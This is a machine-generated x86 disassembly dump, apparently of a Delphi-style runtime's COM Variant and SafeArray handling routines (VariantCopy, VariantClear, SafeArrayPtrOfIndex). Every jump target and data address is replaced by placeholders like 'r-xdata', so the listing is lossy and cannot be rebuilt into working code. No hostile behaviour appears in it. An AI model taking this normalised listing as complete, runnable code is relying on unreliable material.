mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
jmp r-xdata
sub eax 0x49
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
jmp r-xdata
dec eax
je r-xdata
call sub_43e664
jmp r-xdata
sub eax 0x80004001
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
jmp r-xdata
jmp r-xdata
call sub_43e754
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
jmp r-xdata
sub eax 0xbffe
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0x11
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x0
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_439344
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0x11
lea eax [ ebp - 0x38 ]
push eax
push 0x2
lea edx [ ebp - 0x40 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c88
call sub_448c38
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
jmp r-xdata
jmp r-xdata
sub_43eb4c
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov ebx eax
sub ebx 0x80020005
je r-xdata
mov eax edx
mov edx ecx
call sub_43e6b8
jmp r-xdata
sub ebx 0x5
je r-xdata
mov eax edx
mov edx ecx
call sub_43e7fc
jmp r-xdata
jmp r-xdata
call sub_43e8ec
sub_43eb80
push ebx
push esi
mov esi edx
mov ebx eax
call sub_447580
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
call sub_447580
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_43eb4c
pop esi
pop ebx
retn
call sub_447580
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_43eb4c
jmp r-xdata
call sub_4475c0
mov edx eax
mov eax edx
call sub_448c38
mov ecx esi
mov edx ebx
mov eax 0x80020005
call sub_43eb4c
jmp r-xdata
pop esi
pop ebx
retn
sub_43ec04
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_43ec4e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ec55
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_43ec6c
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_43ec9c
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_43ec9c
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_43ecf8
push ebp
mov ebp esp
add esp 0xfffffce8
push ebx
push esi
push edi
mov [ ebp - 0x304 ] eax
mov eax [ ebp - 0x304 ]
test [ eax + 0x1 ] 0x20
jne r-xdata
mov eax [ ebp - 0x304 ]
movzx eax [ eax ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_43eb40
mov eax [ ebp - 0x304 ]
push eax
call VariantClear
call sub_43eb40
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x304 ]
test ah 0x40
je r-xdata
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x308 ] eax
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x308 ] eax
jmp r-xdata
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x308 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_43ec6c
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x318 ] eax
mov eax [ ebp - 0x318 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetLBound
call sub_43eb40
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetUBound
call sub_43eb40
mov eax [ ebp - 0x318 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x318 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov eax ebx
call sub_43ec9c
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayPtrOfIndex
call sub_43eb40
mov eax [ ebp - 0x314 ]
call sub_43ef08
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
sub_43ee74
push ebx
push esi
push ecx
mov ebx eax
movzx esi [ ebx ]
cmp si 0x14
jae r-xdata
cmp si 0x100
jne r-xdata
push ebx
call VariantClear
call sub_43eb40
jmp r-xdata
cmp si 0x102
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
call sub_449348
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp si 0x101
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
xor edx edx
call sub_449d2c
jmp r-xdata
test si 0x2000
je r-xdata
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax esi
call sub_44534c
test al al
je r-xdata
mov eax ebx
call sub_43ecf8
jmp r-xdata
push ebx
call VariantClear
push ebx
call VariantInit
mov edx ebx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_43ef24
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_43ef54
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_43ef54
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_43efb0
push ebp
mov ebp esp
add esp 0xfffffce0
push ebx
push esi
push edi
mov [ ebp - 0x308 ] ecx
mov ebx edx
mov [ ebp - 0x304 ] eax
test [ ebx + 0x1 ] 0x20
jne r-xdata
movzx eax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_43eb40
push ebx
mov eax [ ebp - 0x304 ]
push eax
call VariantCopy
call sub_43eb40
test ah 0x40
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x314 ] eax
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x314 ] eax
jmp r-xdata
lea eax [ ebp - 0x300 ]
push eax
mov eax [ ebp - 0x310 ]
push eax
push 0xc
call SafeArrayCreate
mov esi eax
test esi esi
jne r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x314 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x304 ]
call sub_43ef08
mov eax [ ebp - 0x304 ]
mov [ eax ] 0x200c
mov eax [ ebp - 0x304 ]
mov [ eax + 0x8 ] esi
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
call sub_43e898
mov eax esi
mov [ ebp - 0x320 ] eax
mov eax [ ebp - 0x320 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetLBound
call sub_43eb40
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetUBound
call sub_43eb40
mov eax [ ebp - 0x320 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x320 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_43ef24
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
push ebp
mov eax ebx
call sub_43ef54
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayPtrOfIndex
call sub_43eb40
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push esi
call SafeArrayPtrOfIndex
call sub_43eb40
mov eax [ ebp - 0x318 ]
mov edx eax
mov eax [ ebp - 0x31c ]
call [ ebp - 0x308 ]
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43f184
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
movzx edi [ esi ]
cmp di 0x14
jae r-xdata
mov eax ebx
call sub_43ee74
cmp di 0x100
jne r-xdata
push esi
push ebx
call VariantCopy
call sub_43eb40
jmp r-xdata
cmp di 0x102
jne r-xdata
mov [ ebx ] 0x100
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_44939c
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
cmp di 0x101
jne r-xdata
mov [ ebx ] 0x102
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_449d2c
jmp r-xdata
test di 0x2000
je r-xdata
mov [ ebx ] di
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax edi
call sub_44534c
test al al
je r-xdata
mov ecx sub_43f17c
mov edx esi
mov eax ebx
call sub_43efb0
jmp r-xdata
push esi
push ebx
call VariantCopy
call sub_43eb40
push 0x0
mov ecx esi
mov edx ebx
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
sub_43f250
push ebx
push esi
mov ebx edx
mov esi eax
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
test [ ebx ] 0xbfe8
jne r-xdata
mov edx ebx
mov eax esi
call sub_43f184
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax esi
call sub_43ee74
sub_43f294
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_43f2f0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_43f250
lea eax [ ebp - 0x10 ]
call [ rw-data ]
movzx ecx di
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_43f568
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f2f7
lea eax [ ebp - 0x10 ]
call sub_43ef08
retn
sub_43f300
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43f33e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_442f38
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_444044
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f345
lea eax [ ebp - 0x4 ]
call sub_4499d8
retn
sub_43f34c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43f38a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4426e0
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_444018
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f391
lea eax [ ebp - 0x4 ]
call sub_449348
retn
sub_43f398
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43f3d6
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_443610
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_44407c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f3dd
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_43f3e4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43f422
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_443d0c
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4440d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f429
lea eax [ ebp - 0x4 ]
call sub_44b8d8
retn
sub_43f430
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43f46e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_443c40
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4440a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f475
lea eax [ ebp - 0x4 ]
call sub_44b8d8
retn
sub_43f47c
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
movzx eax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0x14
jb r-xdata
mov edx esi
and dx 0xfff
cmp dx 0x14
jae r-xdata
mov edx ebx
mov eax edi
mov ecx 0x8
call sub_43f568
push esi
push 0x0
push 0x400
push edi
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov ecx esi
call sub_43eb4c
jmp r-xdata
mov edx esi
call sub_43e6b8
push esi
push 0x0
push 0x400
push ebx
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov ecx esi
call sub_43eb4c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43f4fc
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov ebx edx
mov edi eax
movzx ebp [ ebx ]
cmp bp 0x101
jne r-xdata
mov edx esp
mov eax ebp
call sub_44534c
test al al
je r-xdata
mov edx ebx
mov eax edi
mov ecx esi
call sub_43f294
jmp r-xdata
mov edx esp
mov eax esi
call sub_44534c
test al al
je r-xdata
push esi
mov ecx ebx
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx esi
call sub_43f47c
mov ecx ebx
mov edx edi
mov eax [ esp ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
jmp r-xdata
sub_43f568
push ebx
push esi
mov ebx edx
mov esi eax
movzx eax [ ebx ]
movzx edx ax
cmp ecx edx
jne r-xdata
cmp ax 0x400c
jne r-xdata
mov edx ebx
mov eax esi
call sub_43f250
pop esi
pop ebx
retn
mov edx ecx
cmp edx 0x15
ja r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_43f568
jmp r-xdata
mov edx ecx
sub edx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_43f5ad ]
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_43f34c
jmp r-xdata
dec edx
je r-xdata
cmp [ ebx ] 0x1
jne r-xdata
mov eax esi
call sub_43ec58
jmp r-xdata
mov eax ebx
call sub_43ff60
mov edx eax
mov eax esi
call sub_443ec0
jmp r-xdata
mov eax ebx
call sub_43f954
mov edx eax
mov eax esi
call sub_443df4
jmp r-xdata
mov eax ebx
call sub_4415a0
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax esi
call sub_443f0c
jmp r-xdata
mov eax ebx
call sub_441194
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_443f30
jmp r-xdata
mov eax ebx
call sub_441fa8
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax esi
call sub_443f5c
jmp r-xdata
mov eax ebx
call sub_4419ac
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_443f88
jmp r-xdata
mov edx ebx
mov eax esi
call sub_43f300
jmp r-xdata
mov eax ebx
call sub_440c2c
mov edx eax
mov eax esi
call sub_443fb4
jmp r-xdata
mov eax ebx
call sub_43fe04
mov edx eax
mov eax esi
call sub_443ea0
jmp r-xdata
mov eax ebx
call sub_43feb8
mov edx eax
mov eax esi
call sub_443e14
jmp r-xdata
mov eax ebx
call sub_440058
mov edx eax
mov eax esi
call sub_443e34
jmp r-xdata
mov eax ebx
call sub_440134
mov edx eax
mov eax esi
call sub_443e54
jmp r-xdata
mov eax ebx
call sub_440484
push edx
push eax
mov eax esi
call sub_443ee0
jmp r-xdata
mov eax ebx
call sub_440914
push edx
push eax
mov eax esi
call sub_443e74
jmp r-xdata
mov edx ebx
mov eax esi
call sub_43f3e4
jmp r-xdata
mov edx ebx
mov eax esi
call sub_43f430
jmp r-xdata
mov dx 0x101
call sub_43e6b8
jmp r-xdata
dec edx
je r-xdata
mov eax esi
call sub_43ef08
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_43f398
jmp r-xdata
jmp r-xdata
xor edx edx
mov ax 0x1
call sub_43e6b8
jmp r-xdata
mov edx ebx
mov eax esi
call sub_43f4fc
sub_43f7bc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43f85f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x4 ]
call sub_442f38
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_449f7c
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
call sub_4358d8
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f866
lea eax [ ebp - 0xc ]
call j_sub_449348
lea eax [ ebp - 0x4 ]
call sub_4499d8
retn
mov eax ebx
call sub_440c2c
and eax 0x7f
mov [ ebp - 0x8 ] eax
jmp r-xdata
movzx edx [ ebx ]
mov cx 0x3
call sub_43eb4c
jmp r-xdata
sub_43f870
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov cx 0x3
call sub_43eb4c
mov eax [ esp + 0x8 ]
add esp 0x10
pop ebx
retn
sub_43f8ac
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x14 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_43f900
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x14 ]
call sub_43f250
lea eax [ ebp - 0x14 ]
call [ rw-data ]
lea eax [ ebp - 0x14 ]
call sub_43f954
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f907
lea eax [ ebp - 0x14 ]
call sub_43ef08
retn
sub_43f910
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
movzx eax [ esi ]
call sub_44534c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x3
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
sub_43f954
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_43fdd5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
movzx edx ax
cmp edx 0x15
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_43f987 ]
mov eax [ ebp - 0x4 ]
call sub_43f7bc
mov [ ebp - 0x8 ] eax
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_447960
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_447960
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_447960
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_447960
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43f7bc
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ eax + 0x8 ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ eax + 0x8 ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_43f954
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_43f870
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_43f8ac
mov [ ebp - 0x8 ] eax
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x3
mov ax 0x1
call sub_43e6b8
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_448078
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_448078
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_448078
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_448078
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_448078
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_448078
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_448078
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_43f7bc
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43f910
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x15
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_43f870
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_43f870
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp [ eax * 4 + jump_table_43fbe3 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_447960
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_447960
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_447960
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_447960
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43f7bc
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
